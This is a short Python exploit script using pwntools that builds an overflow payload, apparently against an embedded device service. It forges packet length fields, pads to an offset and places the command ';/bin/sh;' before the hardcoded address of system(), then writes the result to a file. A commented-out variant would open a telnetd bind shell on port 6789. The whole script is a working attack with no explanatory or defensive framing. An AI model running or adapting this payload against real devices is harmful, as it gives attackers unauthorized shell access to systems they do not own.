#!/usr/bin/env python
#-*-coding:utf-8-*-
from pwn import *
#remote
#commend = "; telnetd -l /bin/sh -p 6789 ;"
commend = ";/bin/sh;"

system = 0x00010BB0

length_part1 = p8(0xff)
length_part2 = p8(0xff)
length_part3 = p8(0xff)
content_length_part1 = p8(0xff)
content_length_part2 = p8(0xff)
offset = 0x2fd - 77 - 5 - 4
payload ="*#$^"+length_part1+length_part2+length_part3+content_length_part1+content_length_part2+ 'A'* offset
payload += commend.ljust(0x2f8,"b")
payload += p32(system)

n = ord(length_part3) + 4 * (ord(length_part2) + 2 * ord(length_part1)) #3315
payload_length = ord(content_length_part2) + 2 * ord(content_length_part1) # 0x2fd

with open("shellcode","w") as f:
	f.write(payload)
f.close()

log.info("package_length: "+hex(n))
log.info("strncpy_n_length: "+hex(payload_length))
log.info("payload_length: "+str(len(payload)))

